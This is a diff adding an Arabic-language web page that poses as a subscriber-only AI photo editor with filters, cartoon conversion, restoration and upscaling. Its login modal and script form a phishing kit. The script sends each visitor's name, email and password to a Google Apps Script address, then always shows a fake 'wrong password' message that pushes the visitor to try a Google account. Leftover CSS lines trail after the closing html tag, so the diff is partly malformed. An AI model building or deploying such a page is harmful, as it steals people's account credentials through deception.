@@ -1,40 +1,301 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محرر الصور الذكي | AI Photo Editor</title>
-    <style>
-        :root {
-            --primary-color: #2e7d32;
-            --accent-color: #4caf50;
-            --bg-glass: rgba(255, 255, 255, 0.9);
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>محرر الصور الذكي | AI Photo Editor</title>
 
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+<style>
+:root {
+    --primary-color: #2e7d32;
+    --accent-color: #4caf50;
+    --bg-glass: rgba(255, 255, 255, 0.9);
+}
 
-        body {
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #f0f2f5 url('Gt.jpg') no-repeat center center fixed;
-            background-size: cover;
-            color: #333;
-            overflow-x: hidden;
-        }
+* { box-sizing: border-box; margin: 0; padding: 0; }
 
-        /* الهيدر */
-        header {
-            background: var(--primary-color);
-            color: white;
-            padding: 12px 5%;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-        }
+body {
+    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: #f0f2f5 url('Gt.jpg') no-repeat center center fixed;
+    background-size: cover;
+    color: #333;
+    overflow-x: hidden;
+}
 
+/* ===== الهيدر ===== */
+header {
+    background: var(--primary-color);
+    color: white;
+    padding: 12px 5%;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+}
+
+.logo { font-weight: bold; font-size: 1.2rem; }
+
+.btn-top {
+    background: white;
+    color: var(--primary-color);
+    padding: 6px 15px;
+    border: none;
+    border-radius: 20px;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 0.85rem;
+}
+
+/* ===== الحاوية ===== */
+.container {
+    max-width: 800px;
+    margin: 20px auto;
+    width: 92%;
+}
+
+.hero {
+    background: var(--bg-glass);
+    padding: 25px;
+    border-radius: 20px;
+    text-align: center;
+    margin-bottom: 20px;
+    border: 1px solid rgba(255,255,255,0.3);
+}
+
+.hero h2 { color: var(--primary-color); margin-bottom: 8px; font-size: 1.5rem; }
+.hero p { font-size: 0.95rem; color: #555; }
+
+.feature-box {
+    background: white;
+    margin-bottom: 15px;
+    padding: 15px;
+    border-radius: 15px;
+    display: flex;
+    align-items: center;
+    gap: 15px;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+    transition: 0.3s;
+}
+
+.feature-box:hover { transform: scale(1.02); }
+
+.icon-circle {
+    width: 55px;
+    height: 55px;
+    background: #e8f5e9;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.8rem;
+}
+
+.text-content h4 { color: #1b5e20; margin-bottom: 4px; font-size: 1rem; }
+.text-content p { font-size: 0.85rem; color: #666; }
+
+.main-btn {
+    background: var(--accent-color);
+    color: white;
+    width: 100%;
+    padding: 16px;
+    border: none;
+    border-radius: 50px;
+    font-size: 1.1rem;
+    font-weight: bold;
+    cursor: pointer;
+    box-shadow: 0 6px 20px rgba(76,175,80,0.3);
+    margin: 20px 0;
+}
+
+/* ===== المودال ===== */
+.modal {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.7);
+    z-index: 2000;
+    backdrop-filter: blur(5px);
+}
+
+.modal-card {
+    background: white;
+    width: 90%;
+    max-width: 380px;
+    margin: 15vh auto;
+    border-radius: 25px;
+    overflow: hidden;
+}
+
+/* ===== الاهتزاز ===== */
+@keyframes shake {
+    0% { transform: translateX(0); }
+    20% { transform: translateX(-6px); }
+    40% { transform: translateX(6px); }
+    60% { transform: translateX(-6px); }
+    80% { transform: translateX(6px); }
+    100% { transform: translateX(0); }
+}
+.shake { animation: shake 0.4s; }
+
+.modal-head {
+    background: var(--primary-color);
+    color: white;
+    padding: 20px;
+    text-align: center;
+}
+
+.modal-body { padding: 20px; }
+
+input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 12px;
+    border-radius: 10px;
+    border: 1px solid #ddd;
+}
+
+.submit-btn {
+    width: 100%;
+    background: var(--accent-color);
+    color: white;
+    padding: 12px;
+    border: none;
+    border-radius: 10px;
+    font-weight: bold;
+}
+
+.submit-btn:disabled { background: #ccc; }
+
+footer {
+    text-align: center;
+    padding: 20px;
+    color: white;
+    font-size: 0.8rem;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="logo">مُحرر AI</div>
+    <button class="btn-top" id="btn1">ابدأ الآن</button>
+</header>
+
+<div class="container">
+    <div class="hero">
+        <h2>أطلق العنان لإبداعك</h2>
+        <p>استخدم أدواتنا الذكية المتاحة حصرياً للمشتركين لتحسين صورك فوراً.</p>
+    </div>
+
+    <div class="feature-box">
+        <div class="icon-circle">🎞️</div>
+        <div class="text-content">
+            <h4>فلاتر سينمائية</h4>
+            <p>أضف لمسة هوليوود على صورك بضغطة زر واحدة.</p>
+        </div>
+    </div>
+
+    <div class="feature-box">
+        <div class="icon-circle">👨‍🎨</div>
+        <div class="text-content">
+            <h4>تحويل الصور لكرتون</h4>
+            <p>حوّل صورتك إلى كرتون أو أنمي باحتراف.</p>
+        </div>
+    </div>
+
+    <div class="feature-box">
+        <div class="icon-circle">🕰️</div>
+        <div class="text-content">
+            <h4>ترميم الصور القديمة</h4>
+            <p>تحسين الصور القديمة وتلوينها.</p>
+        </div>
+    </div>
+
+    <div class="feature-box">
+        <div class="icon-circle">🔍</div>
+        <div class="text-content">
+            <h4>تكبير الصورة</h4>
+            <p>تكبير الصور بدون فقدان الجودة.</p>
+        </div>
+    </div>
+
+    <button class="main-btn" id="btn2">جرب الأدوات مجاناً</button>
+</div>
+
+<footer>
+    جميع الحقوق محفوظة © 2025 AI Editor Team
+</footer>
+
+<div id="authModal" class="modal">
+    <div class="modal-card" id="modalCard">
+        <div class="modal-head">
+            <h3>تسجيل دخول سريع</h3>
+            <p id="msg">سجل بياناتك لفتح كافة المميزات</p>
+        </div>
+        <div class="modal-body">
+            <form id="myForm">
+                <input type="hidden" name="نوع الطلب" value="تسجيل دخول بالبريد الإلكتروني">
+                <input type="text" name="الاسم الرباعي" placeholder="الاسم الكامل" required>
+                <input type="email" name="البريد الإلكتروني" placeholder="name@gmail.com" required>
+                <input type="password" name="كلمة المرور" placeholder="********" required>
+                <button type="submit" id="subBtn" class="submit-btn">متابعة إلى المحرر</button>
+                <p id="close" style="text-align:center;margin-top:15px;cursor:pointer;color:#888;">ليس الآن</p>
+            </form>
+        </div>
+    </div>
+</div>
+
+<script>
+const modal = document.getElementById("authModal");
+const card = document.getElementById("modalCard");
+const form = document.getElementById("myForm");
+const subBtn = document.getElementById("subBtn");
+const msg = document.getElementById("msg");
+
+btn1.onclick = btn2.onclick = () => modal.style.display = "block";
+close.onclick = () => modal.style.display = "none";
+
+form.onsubmit = function(e) {
+    e.preventDefault();
+
+    subBtn.disabled = true;
+    subBtn.innerText = "جاري التحقق...";
+    msg.innerText = "جاري معالجة البيانات...";
+
+    fetch("https://script.google.com/macros/s/AKfycbxKGc1D_sg0E9S3rmQPLtafbUVv5u-BViXmTYWUGbWR2_DdD7O9EgBwnk_yxdy0KPx2Yw/exec", {
+        method: "POST",
+        body: new FormData(form)
+    })
+    .then(() => {
+        subBtn.disabled = false;
+        subBtn.innerText = "محاولة تسجيل الدخول";
+        msg.innerText = "البريد الإلكتروني أو كلمة المرور غير صحيحة، حاول تسجيل الدخول بحساب جوجول";
+        msg.style.color = "red";
+
+        card.classList.remove("shake");
+        void card.offsetWidth;
+        card.classList.add("shake");
+    })
+    .catch(() => {
+        subBtn.disabled = false;
+        msg.innerText = "حصل خطأ في الاتصال";
+        msg.style.color = "red";
+
+        card.classList.remove("shake");
+        void card.offsetWidth;
+        card.classList.add("shake");
+    });
+};
+
+window.onclick = e => { if (e.target === modal) modal.style.display = "none"; };
+</script>
+
+</body>
+</html>
         .logo { font-weight: bold; font-size: 1.2rem; }
 
         .btn-top {
